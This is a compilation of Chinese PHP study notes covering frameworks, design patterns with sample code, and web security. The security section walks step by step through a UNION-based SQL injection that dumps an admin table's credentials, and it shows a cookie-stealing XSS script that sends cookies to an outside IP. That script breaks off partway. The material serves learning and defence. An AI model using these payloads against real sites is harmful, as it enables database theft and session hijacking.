因着这些强大的性能，PHP一度被称为“最好的语言”。PHP主要是用于WEB开发，所以各种PHP开发框架显得极为重要，它们使得程序开发变的简单有效。

1、zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。

功能非常的强大，是一个重量级的框架，ZF 用 100% 面向对象编码实现。 ZF 的组件结构独一无二，每个组件几乎不依靠其他组件。这样的松耦合结构可以让开发者独立使用组件。 我们常称此为 “use-at-will”设计。

2、Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。

Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。



3、KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。

KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数据库源，管理多个缓存，并支持复杂的目录结构。从2.1开始kyphp又极大的增强了安全性，可有效防止sql注入，xss等常见安全问题。

4、initPHP是一款轻量级的php开发框架。

采用分层体系架构，适合大中型网站架构。提供丰富的library类库，以及简单的框架扩展机制，InitPHP还提供详细的开发文档，可以让您在使用该框架的时候更加简单实用。 InitPHP实现了抽象DB层、分层体系架构、缓存无缝切换机制、简单模板机制、多模型部署机制、强大的安全体系，是快速开发php应用的利器。

5. Canphp是一个中国开源的php框架。

主要的设计理念就是为了追求简单，减少php初学者的学习成本，而且追求高效率，模版类不提供其他标签，直接应用php的源代码，还有它是微内核设计，移植性强，松散耦合等特点，能集成到你任何一个系统里面。其中集成的http类相当的强大，采集图片速度相当的快，为什么这样呢？因为适用了模拟异步多进程的原理。

6. CdvPHP 一款简单开源PHP框架，灵感来源于DX。

根据实际开发总结汇成快捷方便的轻量级框架。没有太多的硬性要求，也没有一本超厚的帮助手册。快速开发、部署、学习必备利器。

PHP作为一种服务器端的脚本语言，一般用来做网站，而PHP框架让开发变得简单起来，上述6种框架仅仅只是部分框架，六星教育选取了几个具有代表性的框架单独进行描述，希望能给正在学习PHP的同学们一些帮助。
```

## 框架篇
### ThinkPHP（TP）、CodeIgniter（CI）、Zend（非 OOP 系列）
```
http://www.sjzphp.com/webdis/php_framwork_828.html
php框架这几个一定要知道
发布时间:2019-04-08 18:23:31 来源:互联网 作者:青锋建站
　　php框架就是采用一定设计理念和架构将PHP开发组件进行封闭，并按照软件开发的过程来组织php框架结构，形成的PHP代码集。应用PHP框架进行项目开发，可以大幅度节省开发时间，统一人员合作，减少由于开发水平不统一带来的安全问题。一般PHP项目开发框架集成了这些功能：缓存，表单过滤，MVC架构，统一的数据库接口，请求分发等功能。以下是青锋建站给大家总结的最常用的几个PHP开发框架，各自有各自的特点，需要根据我们的需求来使用。青锋建站，专业致力于PHP网站建设，软件开发，SEO，网络营销，CMS建站二开发。

1、zendframwork
　　zendframwork: (ZF)是Zend公司推出的一套PHP开发框架，是PHP官方开发框架，是框架界的龙头老大。功能非常的强大，是一个重量级的框架，ZF 用 100% 面向对象编码实现。 ZF 的组件结构独一无二，每个组件几乎不依靠其他组件。这样的松耦合结构可以让开发者独立使用组件。 但是由于太庞大，如果是开发小型项目，降低速度性能。

2、Yii框架
　　Yii框架由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。

3、TP5框架
　　之所以把TP5框架放在这个位置，主要是现在国内使用太普遍了，正是由于提供了全面的中文文档支持，才拥有了大量的使用群。ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。

4.Symfony框架
　　Symfony，是一套国外的PHP开源框架。简单的模板功能symfony是一个开源的PHP Web框架。基于最佳Web开发实践，已经有多个网站完全采用此框架开发，symfony的目的是加速Web应用的创建与维护。 它的特点如下：缓存管理 、自定义URLs、搭建了一些基础模块、多语言与I18N支持、采用对象模型与MVC分离、Ajax支持、适用于企业应用开发。

5、CodeIgniter（CI）框架
　　CodeIgniter 是一个简单快速的PHP MVC 框架。它为组织提供了足够的自由支持，允许开发人员更迅速地工作。使用 CodeIgniter 时，您不必以某种方式命名数据库表，也不必根据表命名模型。这使 CodeIgniter 成为重构遗留 PHP 应用程序的理想选择，在此类遗留应用程序中，可能存在需要移植的所有奇怪的结构。

6、CanPHP框架
　　CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。它既可以完美的支持MVC模式，又可以不受限制的支持传统编程模式。它是一个轻量级的php框架，同时也是一个实用的php工具 包。以面向应用为主，不纠结于OOP，不纠结于MVC，不纠结于设计模式，不拘一格，力求简单快速优质的完成项目开发，是中小型项目开发首选。

7、Laravel 简单优雅框架
　　Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。在Laravel中已经具有了一套高级的PHP ActiveRecord实现 -- Eloquent ORM。它能方便的将“约束（constraints）”应用到关系的双方，这样你就具有了对数据的完全控制，而且享受到ActiveRecord的所有便利。Eloquent原生支持Fluent中查询构造器（query-builder）的所有方法。

8、SlimFramework框架
　　SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。可以帮助你快速编写简单功能强大的 RESTful 风格的web应用程序 和APIs。Slim很简单，可以让新手和专业人士使用。

 

9、CakePHP框架.
　　CakePHP是国外的框架，是一个运用了诸如ActiveRecord、Association Data Mapping、Front Controller和MVC等著名设计模式的快速开发框架。
该项目主要目标是提供一个可以让各种层次的PHP开发人员快速地开发出健壮的Web应用，而又不失灵活性

10、PHPUnit框架
　　PHPUnit是一个轻量级的PHP测试框架。它是在PHP5下面对JUnit3系列版本的完整移植。这个工具也可以被Xdebug扩展用来生成代码覆盖率报告 ，并且可以与phing集成来自动测试，最合它还可以和Selenium整合来完成大型的自动化集成测试。

11、KYPHP框架
　　KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数据库源，管理多个缓存，并支持复杂的目录结构。从2.1开始kyphp又极大的增强了安全性，可有效防止sql注入，xss等常见安全问题。

12、initPHP框架
　　initPHP是一款轻量级的php开发框架。采用分层体系架构，适合大中型网站架构。提供丰富的library类库，以及简单的框架扩展机制，InitPHP还提供详细的开发文档，可以让您在使用该框架的时候更加简单实用。 InitPHP实现了抽象DB层、分层体系架构、缓存无缝切换机制、简单模板机制、多模型部署机制、强大的安全体系，是快速开发php应用的利器。

13、SpeedPHP框架
　　SpeedPHP是一款全功能的国产PHP应用框架系统。SpeedPHP框架是从实际运行的商业系统中取其精华而成的，在稳定性和运行速度上都非常出色；同时有着清晰的架构，更有利于提高团队开发效率，教程众多，入门容易，号称最适合初学者的PHP框架，快速带你进入PHP高手的行列。
　　一般来说如果对于小型项目完全没有必要使用框架，框架集成了太多的功能组件，许多无用的功能也带进来，减慢了系统运行的速度。对于水平不高而又需要开发大型PHP项目，使用PHP框架绝对是首选。对于PHP高手，做做项目就形成了自己的框架，按照自己的习惯写的框架，符合自己特定需求，当然速度上更快，何况PHP官方也称PHP可以不依赖框架，也不推荐使用框架。
```

### Yaf、Phalcon（C 扩展系）
```
https://www.zhihu.com/question/25023032


```

### Swoole、Workerman （网络编程框架）
```
https://baijiahao.baidu.com/s?id=1608873823322214852&wfr=spider&for=pc
目前php通信服务框架最流行的有swoole与workerman俩个框架，swoole是有C语言开发的php扩展类，而workerman是纯PHP开发框架，可能swoole比workerman出名，在百度、腾讯公司都有在使用，使用频率也比较高，那么我们来看下php通信服务框架选择swoole还是workerman？


swoole是C语言开发的扩展框架，由于有着C语言的优势，swoole在内存管理、数据结构、通信协议解析明显优势于workerman，而且swoole在目前通信协议，提供更高级的通信功能，所以workerman能开发的，swoole都可以，而且功能更多，速度更快，多年的发展稳定性强。swoole也有自己的缺点，不能根据自己需要开发，而且需要PHP程序员了解底层通信服务开发，需要学习的知识比较多，swoole一般适合老手开发。


workerman是纯PHP编程语言开发，在需要的时候可以根据需求二次开发，workerman不需要了解太多通信服务，底层框架也不用学习，更不用借助PHP环境开发，可以独立运行，workerman提供完整的通信协议框架，也可以自定义开发协议，所以workerman比较适合新手PHP程序员，workerman资料文档相对来说比swoole多。workerman缺点是需要安装扩展类比较多，在高并发性能，稳定性比不上swoole。

swoole与workerman在一般项目中根本看不出来哪个比较好用，所以不是开发大型类型网站的，新手可以选择workerman提高开发速度，老手选择swoole可以证明自己的实力。

https://www.zhihu.com/question/47994137?sort=created
```

## 设计模式
### php的设计模式
```
1. ###*单例模式**
一个类在整个应用中，只有一个对象实例的设计模式
类必须自行创建这个实例
必须自行向整个系统提供这个实例
###*三私**：私有静态成员变量、构造函数、克隆函数
###*一公**：公共的静态方法

2. ###*工厂模式**
可以根据输入的参数或者应用程序配置的不同,创建一种专门用来实例化并返回其它类的实例的类

3. 观察者模式
观察者模式提供了组件之间紧密耦合的另一种方法。
该模式：一个对象通过添加一个方法（该方法允许另一个对象，即观察者注册自己）全本身变得可观察。
当可观察的对象更改时，它会将消息发送到已注册的观察者。这些观察者使用该信息执行的操作与可观察的对象无关。

4. 命令链模式：
以松散耦合主题为基础，发送消息、命令和请求，或通过一组处理程序发送任意内容。
每个处理程序都会自行判断自己能否处理请求，如果可以，该请求被处理，进程停止。

5. 策略模式：
此算法是从复杂类提取的，因而可以方便地替换。
```
```
设计模式
单例模式解决的是如何在整个项目中创建唯一对象实例的问题，工厂模式解决的是如何不通过new建立实例对象的方法。

单例模式
$_instance必须声明为静态的私有变量
构造函数和析构函数必须声明为私有,防止外部程序new 类从而失去单例模式的意义
getInstance()方法必须设置为公有的,必须调用此方法 以返回实例的一个引用
::操作符只能访问静态变量和静态函数
new对象都会消耗内存
使用场景:最常用的地方是数据库连接。
使用单例模式生成一个对象后， 该对象可以被其它众多对象所使用。
私有的__clone()方法防止克隆对象
单例模式，使某个类的对象仅允许创建一个。构造函数private修饰， 
申明一个static getInstance方法，在该方法里创建该对象的实例。如果该实例已经存在，则不创建。比如只需要创建一个数据库连接。

工厂模式
工厂模式，工厂方法或者类生成对象，而不是在代码中直接new。 
使用工厂模式，可以避免当改变某个类的名字或者方法之后，在调用这个类的所有的代码中都修改它的名字或者参数。

复制代码
 1 Test1.php
 2 <?php
 3 class Test1{
 4     static function test(){
 5         echo __FILE__;
 6     }
 7 }
 8 
 9 Factory.php
10 <?php
11 class Factory{
12     /*
13      * 如果某个类在很多的文件中都new ClassName()，那么万一这个类的名字
14      * 发生变更或者参数发生变化，如果不使用工厂模式，就需要修改每一个PHP
15      * 代码，使用了工厂模式之后，只需要修改工厂类或者方法就可以了。
16      */
17     static function createDatabase(){
18         $test = new Test1();
19         return $test;
20     }
21 }
22 
23 Test.php
24 <?php
25 spl_autoload_register('autoload1');
26 
27 $test = Factory::createDatabase();
28 $test->test();
29 function autoload1($class){
30     $dir  = __DIR__;
31     $requireFile = $dir."\\".$class.".php";
32     require $requireFile;
33 }
复制代码


注册模式
注册模式，解决全局共享和交换对象。已经创建好的对象，挂在到某个全局可以使用的数组上，在需要使用的时候，直接从该数组上获取即可。将对象注册到全局的树上。任何地方直接去访问。

复制代码
 1 <?php
 2 
 3 class Register
 4 {
 5     protected static  $objects;
 6     function set($alias,$object)//将对象注册到全局的树上
 7     {
 8         self::$objects[$alias]=$object;//将对象放到树上
 9     }
10     static function get($name){
11         return self::$objects[$name];//获取某个注册到树上的对象
12     }
13     function _unset($alias)
14     {
15         unset(self::$objects[$alias]);//移除某个注册到树上的对象。
16     }
17 }
复制代码
适配器模式
将各种截然不同的函数接口封装成统一的API。 
PHP中的数据库操作有MySQL,MySQLi,PDO三种，可以用适配器模式统一成一致，使不同的数据库操作，统一成一样的API。类似的场景还有cache适配器，可以将memcache,redis,file,apc等不同的缓存函数，统一成一致。 
首先定义一个接口(有几个方法，以及相应的参数)。然后，有几种不同的情况，就写几个类实现该接口。将完成相似功能的函数，统一成一致的方法。

复制代码
1 接口 IDatabase
2 <?php
3 namespace IMooc;
4 interface IDatabase
5 {
6     function connect($host, $user, $passwd, $dbname);
7     function query($sql);
8     function close();
9 }
复制代码
复制代码
 1 MySQL
 2 <?php
 3 namespace IMooc\Database;
 4 use IMooc\IDatabase;
 5 class MySQL implements IDatabase
 6 {
 7     protected $conn;
 8     function connect($host, $user, $passwd, $dbname)
 9     {
10         $conn = mysql_connect($host, $user, $passwd);
11         mysql_select_db($dbname, $conn);
12         $this->conn = $conn;
13     }
14 
15     function query($sql)
16     {
17         $res = mysql_query($sql, $this->conn);
18         return $res;
19     }
20 
21     function close()
22     {
23         mysql_close($this->conn);
24     }
25 }
复制代码
复制代码
 1 MySQLi
 2 <?php
 3 namespace IMooc\Database;
 4 use IMooc\IDatabase;
 5 class MySQLi implements IDatabase
 6 {
 7     protected $conn;
 8 
 9     function connect($host, $user, $passwd, $dbname)
10     {
11         $conn = mysqli_connect($host, $user, $passwd, $dbname);
12         $this->conn = $conn;
13     }
14 
15     function query($sql)
16     {
17         return mysqli_query($this->conn, $sql);
18     }
19 
20     function close()
21     {
22         mysqli_close($this->conn);
23     }
24 }
复制代码
复制代码
 1 PDO
 2 <?php
 3 namespace IMooc\Database;
 4 use IMooc\IDatabase;
 5 class PDO implements IDatabase
 6 {
 7     protected $conn;
 8     function connect($host, $user, $passwd, $dbname)
 9     {
10         $conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd);
11         $this->conn = $conn;
12     }
13 function query($sql)
14     {
15         return $this->conn->query($sql);
16     }
17 
18     function close()
19     {
20         unset($this->conn);
21     }
22 }
复制代码
通过以上案例，PHP与MySQL的数据库交互有三套API，在不同的场景下可能使用不同的API，那么开发好的代码，换一个环境，可能就要改变它的数据库API，那么就要改写所有的代码，使用适配器模式之后，就可以使用统一的API去屏蔽底层的API差异带来的环境改变之后需要改写代码的问题。

策略模式
策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境。 
eg：假如有一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有的广告位展示不同的广告。在传统的代码中，都是在系统中加入各种if else的判断，硬编码的方式。如果有一天增加了一种用户，就需要改写代码。使用策略模式，如果新增加一种用户类型，只需要增加一种策略就可以。其他所有的地方只需要使用不同的策略就可以。 
首先声明策略的接口文件，约定了策略的包含的行为。然后，定义各个具体的策略实现类。

复制代码
 1 UserStrategy.php
 2 <?php
 3 /*
 4  * 声明策略文件的接口，约定策略包含的行为。
 5  */
 6 interface UserStrategy
 7 {
 8     function showAd();
 9     function showCategory();
10 }
复制代码
复制代码
 1 FemaleUser.php
 2 <?php
 3 require_once 'Loader.php';
 4 class FemaleUser implements UserStrategy
 5 {
 6     function showAd(){
 7         echo "2016冬季女装";
 8     }
 9     function showCategory(){
10         echo "女装";
11     }
12 }
复制代码
复制代码
 1 MaleUser.php
 2 <?php
 3 require_once 'Loader.php';
 4 class MaleUser implements UserStrategy
 5 {
 6     function showAd(){
 7         echo "IPhone6s";
 8     }
 9     function showCategory(){
10         echo "电子产品";
11     }
12 }
复制代码
复制代码
 1 Page.php//执行文件
 2 <?php
 3 require_once 'Loader.php';
 4 class Page
 5 {
 6     protected $strategy;
 7     function index(){
 8         echo "AD";
 9         $this->strategy->showAd();
10         echo "<br>";
11         echo "Category";
12         $this->strategy->showCategory();
13         echo "<br>";
14     }
15     function setStrategy(UserStrategy $strategy){
16         $this->strategy=$strategy;
17     }
18 }
19 
20 $page = new Page();
21 if(isset($_GET['male'])){
22     $strategy = new MaleUser();
23 }else {
24     $strategy = new FemaleUser();
25 }
26 $page->setStrategy($strategy);
27 $page->index();
复制代码
执行结果图： 





 总结： 
通过以上方式，可以发现，在不同用户登录时显示不同的内容，但是解决了在显示时的硬编码的问题。如果要增加一种策略，只需要增加一种策略实现类，然后在入口文件中执行判断，传入这个类即可。实现了解耦。 
实现依赖倒置和控制反转 （有待理解） 
通过接口的方式，使得类和类之间不直接依赖。在使用该类的时候，才动态的传入该接口的一个实现类。如果要替换某个类，只需要提供一个实现了该接口的实现类，通过修改一行代码即可完成替换。

观察者模式
1：观察者模式(Observer)，当一个对象状态发生变化时，依赖它的对象全部会收到通知，并自动更新。 
2：场景:一个事件发生后，要执行一连串更新操作。传统的编程方式，就是在事件的代码之后直接加入处理的逻辑。当更新的逻辑增多之后，代码会变得难以维护。这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件的主体代码。 
3：观察者模式实现了低耦合，非侵入式的通知与更新机制。 


定义一个事件触发抽象类。

复制代码
 1 EventGenerator.php
 2 <?php
 3 require_once 'Loader.php';
 4 abstract class EventGenerator{
 5     private $observers = array();
 6     function addObserver(Observer $observer){
 7         $this->observers[]=$observer;
 8     }
 9     function notify(){
10         foreach ($this->observers as $observer){
11             $observer->update();
12         }
13     }
14 }
复制代码
定义一个观察者接口

复制代码
Observer.php
<?php
require_once 'Loader.php';
interface Observer{
    function update();//这里就是在事件发生后要执行的逻辑
}
复制代码
复制代码
 1 <?php
 2 //一个实现了EventGenerator抽象类的类，用于具体定义某个发生的事件
 3 require 'Loader.php';
 4 class Event extends EventGenerator{
 5     function triger(){
 6         echo "Event<br>";
 7     }
 8 }
 9 class Observer1 implements Observer{
10     function update(){
11         echo "逻辑1<br>";
12     }
13 }
14 class Observer2 implements Observer{
15     function update(){
16         echo "逻辑2<br>";
17     }
18 }
19 $event = new Event();
20 $event->addObserver(new Observer1());
21 $event->addObserver(new Observer2());
22 $event->triger();
23 $event->notify();
复制代码
当某个事件发生后，需要执行的逻辑增多时，可以以松耦合的方式去增删逻辑。也就是代码中的红色部分，只需要定义一个实现了观察者接口的类，实现复杂的逻辑，然后在红色的部分加上一行代码即可。这样实现了低耦合。

原型模式
原型模式（对象克隆以避免创建对象时的消耗） 
1：与工厂模式类似，都是用来创建对象。 
2：与工厂模式的实现不同，原型模式是先创建好一个原型对象，然后通过clone原型对象来创建新的对象。这样就免去了类创建时重复的初始化操作。 
3：原型模式适用于大对象的创建，创建一个大对象需要很大的开销，如果每次new就会消耗很大，原型模式仅需要内存拷贝即可。

复制代码
Canvas.php
<?php
require_once 'Loader.php';
class Canvas{
private $data;
function init($width = 20, $height = 10)
    {
        $data = array();
        for($i = 0; $i < $height; $i++)
        {
            for($j = 0; $j < $width; $j++)
            {
                $data[$i][$j] = '*';
            }
        }
        $this->data = $data;
    }
function rect($x1, $y1, $x2, $y2)
    {
        foreach($this->data as $k1 => $line)
        {
            if ($x1 > $k1 or $x2 < $k1) continue;
           foreach($line as $k2 => $char)
            {
              if ($y1>$k2 or $y2<$k2) continue;
                $this->data[$k1][$k2] = '#';
            }
        }
    }

    function draw(){
        foreach ($this->data as $line){
            foreach ($line as $char){
                echo $char;
            }
            echo "<br>;";
        }
    }
}
复制代码
复制代码
 1 Index.php
 2 <?php
 3 require 'Loader.php';
 4 $c = new Canvas();
 5 $c->init();
 6 / $canvas1 = new Canvas();
 7 // $canvas1->init();
 8 $canvas1 = clone $c;//通过克隆，可以省去init()方法，这个方法循环两百次
 9 //去产生一个数组。当项目中需要产生很多的这样的对象时，就会new很多的对象，那样
10 //是非常消耗性能的。
11 $canvas1->rect(2, 2, 8, 8);
12 $canvas1->draw();
13 echo "-----------------------------------------<br>";
14 // $canvas2 = new Canvas();
15 // $canvas2->init();
16 $canvas2 = clone $c;
17 $canvas2->rect(1, 4, 8, 8);
18 $canvas2->draw();
复制代码
执行结果：



装饰器模式
1：装饰器模式，可以动态的添加修改类的功能 
2：一个类提供了一项功能，如果要在修改并添加额外的功能，传统的编程模式，需要写一个子类继承它，并重写实现类的方法 
3：使用装饰器模式，仅需要在运行时添加一个装饰器对象即可实现，可以实现最大额灵活性。
https://www.cnblogs.com/yuanwanli/p/8796402.html
```
### 单例模式（重点）
```
```

### 工厂模式（重点）
```
```

### 观察者模式（重点）
```
```

### 依赖注入（重点）
```
```

### 装饰器模式
```
```

### 代理模式
```
```

### 组合模式
```
```

## 安全篇
### SQL 注入
### sql注入获取后台管理员账号密码
```
在完全拿下服务器主机之前，存在sql注入漏洞的网站，可能会因此提供给黑客后台管理员的账号密码，黑客登录后台后，上传木马，拿下整个主机。这是sql注入的一种应用场景。

以下讲解sql注入获取后台管理员账号密码的过程，本文以尽力对新手友好的展现过程来讲解基本原理，高手与百事通请避免观看，以免徒耗时间。

为避免读者惹上麻烦，已对原本目标网站信息进行涂抹，并提供笔者自己搭建的测试网站供有兴趣的朋友操作，换句话说，黑我的网站是合法的。

正式开始，在网站中，点击人才招聘，跳转到如下页面，同时地址栏url变为图中所示。

可以看到链接中传给服务器参数，id=2，此处逻辑一般为：服务器获取到id值为2，再通过id值返回给浏览器对应页面或内容，这个过程有可能会经过数据库。

首先惯常试试是否存在sql注入漏洞，将地址栏中的id=2更改为id=2'，即在值2后面添加单引号，回车看结果。

sweet，塔斯丁狗，服务器返回了数据库错误，并详细的打印了错误信息。由错误信息可以得知，网站使用了mysql数据库，并展示了具体的sql语句：

select ### from sy_page where 1 and id=2
这条语句表示：查询sy_page表里id为2的全部数据，而发生错误的原因则是因为多出的单引号使sql语句语法发生错误。

同时可以看出，我们只加过一个单引号'，上图错误信息却显示，实际sql语句中变为了\'反斜杠加单引号，这说明，服务器是做了特殊符号过滤的，以此来防sql注入，这确实起作用，我们便无法注入带有单引号双引号等特殊符号的语句，但其他的注入却是没问题的。

在确定存在sql注入漏洞后，对于查询语句，可以先确定查询的数据有多少列，通过如下图链接所示增加排序条件order by来探测，将地址栏中id=2改为id=2 order by 15，这将使原本的查询语句变成

select ### from sy_page where 1 and id=2 order by 15
这表示，在原来查询结果的基础上进行排序，排序的依据是第15列数据的值。

但实际结果却报错，显示不存在第15列，这正是我们追求的结果，说明查询的出数据不超过15列。

递减列数尝试，直到列数降为10時，才不再报错，如下图所示，说明数据有10列。

在得知列数后，便可以开启真正的掠夺了。那就是在原本的查询结果中加入自己的查询数据。如下图所示，将地址栏中

id=2
改为

id=2 union select 1,2,3,4,5,6,7,8,9,10

这样变化的意图是什么？举个例子，假如下图所示查询数据为网站本来正常的查询结果，id=852，从左至右刚好10列数据。

而加入union select 1,2,3,4,5,6,7,8,9,10后，查询结果便如下图所示。多出了一行结果为1 2 3 4 5 6 7 8 9 10的数据。

而网站中这行多出来的数据没有显示在页面上的原因是什么？可以想像，网站在获取到两行数据后只取了第一行的数据，因为网站根本没预料到会有两行以上的数据。那么我们只需要将自己的数据排到第一行，就可以替代网站本身的数据了。于是再做一次排序，继续追加一句order by 1，根据第一列的值进行排序，便产生如下结果

可以看到，我们自己的数据排到了最前面，这是因为我们自己构建的数据中，第一列的值为1，小于上图示例数据852，于是排到了前面。

随后拿到网站中测试，将

id=2
改为

id=2 union select 1,2,3,4,5,6,7,8,9,10 order by 1
可以看到，我们的内容替换掉了网站内容，第二列数据值2与第6列数据值6显示在了网站页面。

这两列显示数据便成了数据输出窗口。换言之，只需要将2和6的值替换为数据库实际内容，就可以输出到页面显示，被我们看见。

得知第2列和第6列会显示后，便可以开始尝试将2和6替换为系统表数据，将前面的

id=2 union select 1,2,3,4,5,6,7,8,9,10 order by 1
更改为

id=2 union select 1,table_schema,3,4,5,table_name,7,8,9,10 from information_schema.columns order by 1

这句表示，我们自己追加的数据不再是单纯的10个数字，而是从mysql的系统表columns中查询的数据，第二列与第六列分别显示columns表中的table_schema列与table_name列数据。table_schema列存储的是数据库名字信息，table_name列存储着表名信息。下图查询到的数据库名为information_schema，表名为character_sets

上面查询的columns表是mysql的系统表，里面存储着mysql中所有的表名及列信息，如下图的本机展示可以看到所有的表名，列名，列的数据类型，通过这个表，可以爆出所有的表名，列名，及所在数据库，是获取数据的突破口。

下图是一个本机测试，用的是前面爆网站表名的语句：

select ### from table1 where id=852 union select 1,table_schema,3,4,5,table_name,7,8,9,10 from information_schema.columns order by 1
可以看到，所有的表列数据被追加到我们自己的数据里，做个对比的话，下图最后一列数据就像网站正常显示的数据，其他的则是我们注入的数据。

那么如何把这么多行数据逐个爆出来呢？很明显依靠排序是不足以实现的，这时可以再在之前的查询语句后追加一个limit条件，如下图所示

limit m,n
表示筛选出从第m+1行开始的n行数据

limit 0,1
便表示筛选出第一行开始的一行数据，这样如下图就得到了第一行数据，换成limit 1,1则是筛选出第二行数据，以此类推，可以分别得出每一行的数据。

应用到网站中，发现从第41行开始不再是系统表，如下图所示，第41行爆出了数据库名sq_sydata，表名sy_admin

一行一行爆，如图展示，更改limit限定值会爆出其他的表名。

最后爆出了所有的表，如下图所示。

按照命名推断，sy_admin表必定是后台管理员账号表，既然columns系统表中存放着所有列信息，自然也可以用来将sy_admin表的列名爆出来，将

id=2 union select 1,table_schema,3,4,5,table_name,7,8,9,10 from information_schema.columns order by 1
中的table_schema（数据库名）替换为table_name（表名），table_name（表名）替换为column_name（列名），再尝试更改limit的限定值，直到更改为480時开始出现sy_admin表的内容，下图可以看到第481列（limit 480,1）爆出了sy_admin表的一个列名为id。

继续递增列爆481，得到列名loginname。

继续递增，最终爆出sy_admin表的所有列名，如下图所示。

可以推断，上图中的lpginname列应该是用户名，password则是登录密码。

ok，已经得到了sy_admin表的所有列名，接下来就可以开始获取sy_admin表中的实际数据了。

然后我们不再查询系统表，转向sy_admin表，如下图所示，将第二列替换为loginname，第六列替换为password，表名从系统表information_schema.columns（information_schema数据库中的columns表）更换为sq_sydata.sy_admin（sq_sydata数据库中的sy_admin表），再稍微更换limit限定条件，最终得到了后台管理员admin的密码，如下图所示

目标达成。

上图中加密后的密码可以通过工具或百度在线md5解密工具解密，不作赘述。

同样也可以更换列名查出其他的信息，比如下图所示登录次数27次，上次登录于2月1号。以及其他的东西，你懂的。
```
### xss攻击怎么防止
```
XSS又称CSS，全称Cross SiteScript(跨站脚本攻击)， XSS攻击类似于SQL注入攻击，
是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。
其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当用户浏览该网站时，
这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie信息、破坏页面结构
常见的恶意字符XSS输入：
1. XSS 输入通常包含 JavaScript 脚本，如弹出恶意警告框：
`<script>alert("XSS");</script>`
2. XSS 输入也可能是 HTML 代码段，譬如：
    (1) 网页不停地刷新 `<meta http-equiv="refresh" content="0;">`
    (2) 嵌入其它网站的链接，重定向到其它网站等。
方法：利用php htmlentities()函数
php防止XSS跨站脚本攻击的方法：是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数。
```

### XSS 与 CSRF
```
用大白话谈谈XSS与CSRF
csrfxssjavascript安全
发布于 2016-10-01
这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。
XSS与CSRF这两个关键词时常被拉出来一起比较（尤其是面试），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络。

这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解。

国际惯例，先上一下维基百科：

XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
I
CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

维基的解释依旧高深莫测啊，我用 “人话”给大家解释一下吧。

XSS： 通过客户端脚本语言（最常见如：JavaScript）
在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！

CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。

很多同学会搞不明白XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。
XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。

通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。
XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。

简单来说，条条大路（XSS路，命令行路）通罗马（CSRF马，XSRF马）。

前面讲了那么多理论介绍，那么我们来看一看实际代码吧。

【 Talk is cheap，Show me the code 】

场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了（各种姿势混着玩~）

如下：

while(true){
    alert('你关不掉我');
}

这个就是最原始的脚本注入了。
用户进来就麻烦了，一直弹窗一直弹窗。

那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：


// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
